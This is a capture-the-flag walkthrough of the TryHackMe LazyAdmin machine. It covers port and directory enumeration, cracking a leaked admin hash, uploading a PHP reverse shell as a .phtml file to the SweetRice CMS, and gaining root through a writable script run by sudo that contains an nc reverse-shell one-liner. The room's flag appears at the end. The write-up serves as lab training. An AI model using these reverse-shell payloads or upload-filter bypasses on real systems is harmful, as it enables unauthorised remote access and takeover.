# TryHackMe LazyAdmin Writeup

## Nmap scan

```java
nmap -sCV 10.10.123.180
```

```java
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-20 07:36 EDT
Nmap scan report for 10.10.123.180
Host is up (0.27s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds
```

---

```
searchsploit Apache 2.4.18
```

![image](https://github.com/user-attachments/assets/78340e37-e337-49ea-bc03-001eaf8ea88f)

![image](https://github.com/user-attachments/assets/a30625da-953e-485d-a464-3018c3a46e4c)

---

## gobuster

```
gobuster dir -u http://10.10.123.180/ -w /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt
```

![image](https://github.com/user-attachments/assets/931f870f-d0f3-497e-bee8-4ee00e138be6)

```
http://10.10.123.180/content/
```

![image](https://github.com/user-attachments/assets/76b68eb7-4951-4d8d-a30b-b975161bf390)

so we need to found way to open website threw 

``Dashboard`` -> ``General`` -> ``Website setting``

but first login to website how??!!

```
ffuf -u http://10.10.123.180/content/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

![image](https://github.com/user-attachments/assets/0cdadc3b-4f54-4f9a-81bd-c3a8705fa4e9)

```
http://10.10.123.180/content/as/
```

![image](https://github.com/user-attachments/assets/4a0fa750-7480-4e6c-b98b-4b2dca68c00e)

```
http://10.10.123.180/content/inc/
```

![image](https://github.com/user-attachments/assets/4a5ce583-082c-4ba0-8804-7e652c907548)

found mysql backup:

```bash
cat mysql_bakup_20191129023059-1.5.1.sql
```

![image](https://github.com/user-attachments/assets/8d3e9a9c-c2b7-4d7c-b0be-ff3b1d09e20a)

so cridentials :

```
manager : 42f749ade7f9e195bf475f37a44cafcb
```

https://crackstation.net/

![image](https://github.com/user-attachments/assets/b6c4b4f3-0a01-48da-94e3-7d9d4c263dbe)

```
Password123
```

now login with this username and passowrd

![image](https://github.com/user-attachments/assets/f9708c93-0e83-4add-bd67-7d8b0d010cf5)

try to open website again: 

```
http://10.10.123.180/content/
```

![image](https://github.com/user-attachments/assets/f1c8b3ba-508c-47e1-b97c-5c73f2aeb815)

```
https://www.exploit-db.com/
SweetRice
```

---

```
nano shell.phtml
```

WHY ``.phtml`` ???

<details>

![image](https://github.com/user-attachments/assets/0a999cb6-ea51-4217-9fa1-d3e371ea574e)

![image](https://github.com/user-attachments/assets/0710909f-40f1-4c98-b8f1-4680b6f2e775)

accept all nearly exept ``php``

  
</details>

```
<?php
// PHP Reverse Shell
$ip = 'ATTACKER_IP';  // change to your IP
$port = ATTACKER_PORT; // change to your port
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh -i', array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

![image](https://github.com/user-attachments/assets/2e3e8ff9-6208-40ae-9cbf-b55e9ac9f6cd)

```
http://10.10.252.132/content/attachment/shell.phtml
```

![image](https://github.com/user-attachments/assets/88554c46-15a1-4463-9ac7-eda18b2612a6)

![image](https://github.com/user-attachments/assets/8bb9b4af-9ad5-4b0a-bf5a-f655b796e01b)

## preiv esc

```
sudo -l 
```

![image](https://github.com/user-attachments/assets/9fc95859-794e-439c-a18f-2bc446847c14)

---

![image](https://github.com/user-attachments/assets/826e2e9f-af61-42e5-b836-f938b262f2f1)

```
 ls -l /home/itguy/backup.pl
-rw-r--r-x 1 root root 47 Nov 29  2019 /home/itguy/backup.pl
$ cat /home/itguy/backup.pl
#!/usr/bin/perl

system("sh", "/etc/copy.sh");
$ cat /etc/copy.sh
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
$ ls -l /etc/copy.sh
-rw-r--rwx 1 root root 81 Nov 29  2019 /etc/copy.sh
```

so we can edit and excute ``copy.sh``

```
echo "/bin/bash" > /etc/copy.sh 
```

```
sudo /usr/bin/perl /home/itguy/backup.pl
```

![image](https://github.com/user-attachments/assets/a8d3736f-28d4-4b0c-b726-3f6894a5475a)

![image](https://github.com/user-attachments/assets/6dce9141-c769-4cfe-9dd6-253f7f263249)

```
THM{6637f41d0177b6f37cb20d775124699f}
```

